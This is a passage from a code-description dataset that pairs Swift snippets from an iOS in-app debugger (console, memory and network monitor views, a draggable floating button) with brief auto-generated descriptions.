    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1124",
    "code": "private func setupTabBarController() {\n// Add tab bar controller as child view controller\naddChild(debugTabBarController)\nview.addSubview(debugTabBarController.view)\ndebugTabBarController.view.frame = view.bounds\ndebugTabBarController.view.autoresizingMask = [.flexibleWidth, .flexibleHeight]\ndebugTabBarController.didMove(toParent: self)\n\n// Create view controllers for each tab\nlet consoleVC = createConsoleViewController()",
    "nl": "Function setupTabBarController - sets uptabbarcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1125",
    "code": "private func createConsoleViewController() -> UIViewController {\nreturn ConsoleViewController()\n}\n\nprivate func createBreakpointsViewController() -> UIViewController {",
    "nl": "MARK: - Tab View Controllers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1126",
    "code": "private func createBreakpointsViewController() -> UIViewController {\nreturn BreakpointsViewController()\n}\n\nprivate func createVariablesViewController() -> UIViewController {",
    "nl": "Function createBreakpointsViewController - creates breakpointsviewcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1127",
    "code": "private func createVariablesViewController() -> UIViewController {\nreturn VariablesViewController()\n}\n\nprivate func createMemoryViewController() -> UIViewController {",
    "nl": "Function createVariablesViewController - creates variablesviewcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1128",
    "code": "private func createMemoryViewController() -> UIViewController {\nreturn MemoryViewController()\n}\n\nprivate func createNetworkViewController() -> UIViewController {",
    "nl": "Function createMemoryViewController - creates memoryviewcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1129",
    "code": "private func createNetworkViewController() -> UIViewController {\nreturn NetworkMonitorViewController()\n}\n\nprivate func createPerformanceViewController() -> UIViewController {",
    "nl": "Function createNetworkViewController - creates networkviewcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1130",
    "code": "private func createPerformanceViewController() -> UIViewController {\nreturn PerformanceViewController()\n}\n\n// MARK: - Actions\n\n@objc private func closeButtonTapped() {",
    "nl": "Function createPerformanceViewController - creates performanceviewcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1131",
    "code": "@objc private func closeButtonTapped() {\ndelegate?.debuggerViewControllerDidRequestDismissal(self)\n}\n\n@objc private func pauseButtonTapped() {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1132",
    "code": "@objc private func pauseButtonTapped() {\ndebuggerEngine.pause()\n}\n\n@objc private func resumeButtonTapped() {",
    "nl": "Function pauseButtonTapped - implements pausebuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1133",
    "code": "@objc private func resumeButtonTapped() {\ndebuggerEngine.resume()\n}\n\n@objc private func stepOverButtonTapped() {",
    "nl": "Function resumeButtonTapped - implements resumebuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1134",
    "code": "@objc private func stepOverButtonTapped() {\ndebuggerEngine.stepOver()\n}\n\n@objc private func stepIntoButtonTapped() {",
    "nl": "Function stepOverButtonTapped - implements stepoverbuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1135",
    "code": "@objc private func stepIntoButtonTapped() {\ndebuggerEngine.stepInto()\n}\n\n@objc private func stepOutButtonTapped() {",
    "nl": "Function stepIntoButtonTapped - implements stepintobuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1136",
    "code": "@objc private func stepOutButtonTapped() {\ndebuggerEngine.stepOut()\n}\n}\n\n// MARK: - DebuggerEngineDelegate\n\nextension DebuggerViewController: DebuggerEngineDelegate {",
    "nl": "Function stepOutButtonTapped - implements stepoutbuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1137",
    "code": "extension DebuggerViewController: DebuggerEngineDelegate {\nfunc debuggerEngine(_: DebuggerEngine, didHitBreakpoint breakpoint: Breakpoint) {",
    "nl": "MARK: - DebuggerEngineDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1138",
    "code": "func debuggerEngine(_: DebuggerEngine, didHitBreakpoint breakpoint: Breakpoint) {\nlogger.log(message: \"Hit breakpoint at \\(breakpoint.file):\\(breakpoint.line)\", type: .info)\n\n// Switch to breakpoints tab\nDispatchQueue.main.async {",
    "nl": "Function debuggerEngine - implements debuggerengine functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1139",
    "code": "func debuggerEngine(\n_: DebuggerEngine,\ndidTriggerWatchpoint watchpoint: Watchpoint,\noldValue _: Any?,\nnewValue _: Any?\n) {",
    "nl": "Function debuggerEngine - implements debuggerengine functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1140",
    "code": "func debuggerEngine(_: DebuggerEngine, didCatchException exception: ExceptionInfo) {\nlogger.log(message: \"Caught exception: \\(exception.name) - \\(exception.reason)\", type: .error)\n\n// Switch to console tab\nDispatchQueue.main.async {",
    "nl": "Function debuggerEngine - implements debuggerengine functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1141",
    "code": "func debuggerEngine(_: DebuggerEngine, didChangeExecutionState state: ExecutionState) {\nlogger.log(message: \"Execution state changed to \\(state)\", type: .info)\n\n// Update UI based on execution state\nDispatchQueue.main.async {",
    "nl": "Function debuggerEngine - implements debuggerengine functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1142",
    "code": "private func updateUIForExecutionState(_ state: ExecutionState) {\n// Update toolbar buttons based on execution state\nguard let toolbarItems = toolbarItems else { return }",
    "nl": "Function updateUIForExecutionState - updates uiforexecutionstate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1143",
    "code": "class FloatingDebuggerButton: UIButton {\n// Default position values\nprivate let defaultPosition = CGPoint(x: 60, y: 500)\nprivate let cornerRadius: CGFloat = 25\nprivate let buttonSize: CGFloat = 50\n\n// Pan gesture for dragging the button\nprivate var panGesture: UIPanGestureRecognizer?\n\n// Logger instance",
    "nl": "Floating button that provides quick access to the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "class"
  },
  {
    "id": "1144",
    "code": "private func setupButton() {\n// Configure button appearance\nframe = CGRect(x: 0, y: 0, width: buttonSize, height: buttonSize)\nlayer.cornerRadius = cornerRadius\n\n// Shadow for better visibility\nlayer.shadowColor = UIColor.black.cgColor\nlayer.shadowOffset = CGSize(width: 0, height: 2)\nlayer.shadowOpacity = 0.3\nlayer.shadowRadius = 4",
    "nl": "Function setupButton - sets upbutton",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "function"
  },
  {
    "id": "1145",
    "code": "private func setupGestures() {\n// Pan gesture for dragging\nlet newPanGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:)))\nnewPanGesture.minimumNumberOfTouches = 1\nnewPanGesture.maximumNumberOfTouches = 1\naddGestureRecognizer(newPanGesture)\npanGesture = newPanGesture\n}\n\n@objc private func handlePan(_ gesture: UIPanGestureRecognizer) {",
    "nl": "Function setupGestures - sets upgestures",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "function"
  },
  {
    "id": "1146",
    "code": "@objc private func handlePan(_ gesture: UIPanGestureRecognizer) {\nguard let superview = superview else { return }",
    "nl": "Function handlePan - implements handlepan functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "function"
  },
  {
    "id": "1147",
    "code": "private func savePosition() {\nUserDefaults.standard.set(center.x, forKey: positionXKey)\nUserDefaults.standard.set(center.y, forKey: positionYKey)\n}\n\nprivate func restorePosition() {",
    "nl": "Function savePosition - implements saveposition functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "function"
  },
  {
    "id": "1148",
    "code": "private func restorePosition() {\n// Get saved position, or use default\nlet x = UserDefaults.standard.double(forKey: positionXKey)\nlet y = UserDefaults.standard.double(forKey: positionYKey)\n\nif x > 0 && y > 0 {",
    "nl": "Function restorePosition - implements restoreposition functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "function"
  },
  {
    "id": "1149",
    "code": "func updateAppearance() {\n// Get current trait collection\nlet interfaceStyle = UIScreen.main.traitCollection.userInterfaceStyle\n\nif interfaceStyle == .dark {",
    "nl": "/ Update button appearance based on system theme",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "function"
  },
  {
    "id": "1150",
    "code": "@objc private func buttonTapped() {\n// Provide haptic feedback\nlet generator = UIImpactFeedbackGenerator(style: .medium)\ngenerator.impactOccurred()\n\n// Post notification to launch debugger\nNotificationCenter.default.post(name: .showDebugger, object: nil)\n\nlogger.log(message: \"Floating debugger button tapped\", type: .info)\n}",
    "nl": "Function buttonTapped - implements buttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "function"
  },
  {
    "id": "1151",
    "code": "override func didMoveToSuperview() {\nsuper.didMoveToSuperview()\n\n// Restore position when added to view\nif superview != nil {",
    "nl": "Function didMoveToSuperview - implements didmovetosuperview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "function"
  },
  {
    "id": "1152",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\n\n// Update appearance when theme changes\nif traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {",
    "nl": "Function traitCollectionDidChange - implements traitcollectiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "function"
  },
  {
    "id": "1153",
    "code": "extension Notification.Name {\nstatic let showDebugger = Notification.Name(\"showDebugger\")\nstatic let showDebuggerButton = Notification.Name(\"showDebuggerButton\")\nstatic let hideDebuggerButton = Notification.Name(\"hideDebuggerButton\")\n}\n",
    "nl": "Add notification names for debugger button control",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift",
    "code_type": "extension"
  },
  {
    "id": "1154",
    "code": "class MemoryViewController: UIViewController {\n// MARK: - Properties\n\n/// The debugger engine\nprivate let debuggerEngine = DebuggerEngine.shared\n\n/// Logger instance\nprivate let logger = Debug.shared\n\n/// Text view for displaying memory content",
    "nl": "/ View controller for the memory tab in the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1155",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupUI()\nsetupActions()\n\n// Set title\ntitle = \"Memory\"\n}\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1156",
    "code": "private func setupUI() {\n// Set background color\nview.backgroundColor = UIColor.systemBackground\n\n// Add address text field\nview.addSubview(addressTextField)\n\n// Add size text field\nview.addSubview(sizeTextField)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1157",
    "code": "private func setupActions() {\n// Add target for examine button\nexamineButton.addTarget(self, action: #selector(examineButtonTapped), for: .touchUpInside)\n\n// Add target for format segmented control\nformatSegmentedControl.addTarget(self, action: #selector(formatChanged), for: .valueChanged)\n}\n\n// MARK: - Actions\n",
    "nl": "Function setupActions - sets upactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1158",
    "code": "@objc private func examineButtonTapped() {\n// Dismiss keyboard\nview.endEditing(true)\n\n// Get address and size\nguard let addressText = addressTextField.text?.trimmingCharacters(in: .whitespacesAndNewlines),\nlet sizeText = sizeTextField.text?.trimmingCharacters(in: .whitespacesAndNewlines),\n!addressText.isEmpty,\n!sizeText.isEmpty,\nlet size = Int(sizeText)",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1159",
    "code": "@objc private func formatChanged(_: UISegmentedControl) {\n// Re-format the current memory output\nif !memoryTextView.text.isEmpty {",
    "nl": "Function formatChanged - implements formatchanged functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1160",
    "code": "private func showError(_ message: String) {\nlet alertController = UIAlertController(\ntitle: \"Error\",\nmessage: message,\npreferredStyle: .alert\n)\n\nlet okAction = UIAlertAction(title: \"OK\", style: .default)\nalertController.addAction(okAction)\n",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1161",
    "code": "private func formatMemoryOutput(_ output: String) -> String {\n// In a real implementation, this would parse and format the memory output\n// based on the selected format (hex, ASCII, decimal, binary)\n\n// For now, just return the original output\nreturn output\n}\n}\n\n// MARK: - UITextFieldDelegate",
    "nl": "Function formatMemoryOutput - implements formatmemoryoutput functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1162",
    "code": "extension MemoryViewController: UITextFieldDelegate {\nfunc textFieldShouldReturn(_ textField: UITextField) -> Bool {",
    "nl": "MARK: - UITextFieldDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1163",
    "code": "func textFieldShouldReturn(_ textField: UITextField) -> Bool {\nif textField == addressTextField {",
    "nl": "Function textFieldShouldReturn - implements textfieldshouldreturn functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/MemoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1164",
    "code": "class NetworkMonitorViewController: UIViewController {\n// MARK: - Properties\n\n/// The debugger engine\nprivate let debuggerEngine = DebuggerEngine.shared\n\n/// Logger instance\nprivate let logger = Debug.shared\n\n/// Table view for displaying network requests",
    "nl": "/ View controller for the network tab in the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1165",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupUI()\nsetupActions()\nsetupNetworkMonitoring()\n\n// Set title\ntitle = \"Network\"\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1166",
    "code": "private func setupUI() {\n// Set background color\nview.backgroundColor = UIColor.systemBackground\n\n// Add search bar\nview.addSubview(searchBar)\n\n// Add clear button\nview.addSubview(clearButton)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1167",
    "code": "private func setupActions() {\n// Add target for refresh control\nrefreshControl.addTarget(self, action: #selector(refreshNetworkRequests), for: .valueChanged)\n\n// Add target for clear button\nclearButton.addTarget(self, action: #selector(clearButtonTapped), for: .touchUpInside)\n}\n\nprivate func setupNetworkMonitoring() {",
    "nl": "Function setupActions - sets upactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1168",
    "code": "private func setupNetworkMonitoring() {\n// In a real implementation, this would set up URLProtocol swizzling\n// to intercept and monitor network requests\n\n// For now, just log that network monitoring is set up\nlogger.log(message: \"Network monitoring set up\", type: .info)\n}\n\n// MARK: - Actions\n",
    "nl": "Function setupNetworkMonitoring - sets upnetworkmonitoring",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1169",
    "code": "@objc private func refreshNetworkRequests() {\n// In a real implementation, this would refresh the network requests\n\n// For now, just end refreshing\nrefreshControl.endRefreshing()\n}\n\n@objc private func clearButtonTapped() {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1170",
    "code": "@objc private func clearButtonTapped() {\n// Clear network requests\nnetworkRequests.removeAll()\nfilteredRequests.removeAll()\n\n// Reload table view\ntableView.reloadData()\n}\n\n// MARK: - Helper Methods",
    "nl": "Function clearButtonTapped - implements clearbuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1171",
    "code": "private func addSampleData() {\n// Add some sample network requests for demonstration\nlet request1 = NetworkRequest(\nurl: URL(string: \"https://api.example.com/users\")!,\nmethod: \"GET\",\nrequestHeaders: [\"Authorization\": \"Bearer token123\"],\nrequestBody: nil,\nresponseStatus: 200,\nresponseHeaders: [\"Content-Type\": \"application/json\"],\nresponseBody: \"{\\\"users\\\": [{\\\"id\\\": 1, \\\"name\\\": \\\"John\\\"}]}\",",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1172",
    "code": "private func filterRequests() {\n// Apply search filter\nif searchText.isEmpty {",
    "nl": "Function filterRequests - implements filterrequests functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1173",
    "code": "extension NetworkMonitorViewController: UITableViewDelegate {\nfunc tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {",
    "nl": "MARK: - UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1174",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\n// Get request\nlet request = filteredRequests[indexPath.row]\n\n// Show request details\nlet detailsVC = NetworkRequestDetailsViewController(request: request)\nnavigationController?.pushViewController(detailsVC, animated: true)\n}",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1175",
    "code": "func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat {\nreturn 70\n}\n}\n\n// MARK: - UITableViewDataSource\n\nextension NetworkMonitorViewController: UITableViewDataSource {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1176",
    "code": "extension NetworkMonitorViewController: UITableViewDataSource {\nfunc tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1177",
    "code": "func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn filteredRequests.count\n}\n\nfunc tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1178",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nguard let cell = tableView.dequeueReusableCell(\nwithIdentifier: NetworkRequestTableViewCell.reuseIdentifier,\nfor: indexPath\n) as? NetworkRequestTableViewCell else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1179",
    "code": "extension NetworkMonitorViewController: UISearchBarDelegate {\nfunc searchBar(_: UISearchBar, textDidChange searchText: String) {",
    "nl": "MARK: - UISearchBarDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1180",
    "code": "func searchBar(_: UISearchBar, textDidChange searchText: String) {\n// Update search text\nself.searchText = searchText\n\n// Apply filter\nfilterRequests()\n}\n\nfunc searchBarSearchButtonClicked(_ searchBar: UISearchBar) {",
    "nl": "Function searchBar - implements searchbar functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1181",
    "code": "func searchBarSearchButtonClicked(_ searchBar: UISearchBar) {\n// Dismiss keyboard\nsearchBar.resignFirstResponder()\n}\n}\n\n// MARK: - NetworkRequest\n\nstruct NetworkRequest {",
    "nl": "Function searchBarSearchButtonClicked - implements searchbarsearchbuttonclicked functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1182",
    "code": "struct NetworkRequest {\nlet url: URL\nlet method: String\nlet requestHeaders: [String: String]\nlet requestBody: String?\nlet responseStatus: Int\nlet responseHeaders: [String: String]\nlet responseBody: String?\nlet timestamp: Date\nlet duration: TimeInterval",
    "nl": "MARK: - NetworkRequest",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "struct"
  },
  {
    "id": "1183",
    "code": "class NetworkRequestTableViewCell: UITableViewCell {\n// MARK: - Properties\n\nstatic let reuseIdentifier = \"NetworkRequestTableViewCell\"\n\n/// URL label\nprivate let urlLabel: UILabel = {",
    "nl": "MARK: - NetworkRequestTableViewCell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1184",
    "code": "private func setupUI() {\n// Add method label\ncontentView.addSubview(methodLabel)\n\n// Add URL label\ncontentView.addSubview(urlLabel)\n\n// Add status label\ncontentView.addSubview(statusLabel)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1185",
    "code": "func configure(with request: NetworkRequest) {\n// Set URL label\nurlLabel.text = request.url.absoluteString\n\n// Set method label\nmethodLabel.text = request.method\n\n// Set method label background color\nswitch request.method {",
    "nl": "MARK: - Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1186",
    "code": "class NetworkRequestDetailsViewController: UIViewController {\n// MARK: - Properties\n\n/// The network request\nprivate let request: NetworkRequest\n\n/// Scroll view\nprivate let scrollView: UIScrollView = {",
    "nl": "MARK: - NetworkRequestDetailsViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1187",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupUI()\nsetupActions()\n\n// Set title\ntitle = request.url.lastPathComponent\n}\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1188",
    "code": "private func setupUI() {\n// Set background color\nview.backgroundColor = UIColor.systemBackground\n\n// Add scroll view\nview.addSubview(scrollView)\n\n// Add content view\nscrollView.addSubview(contentView)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1189",
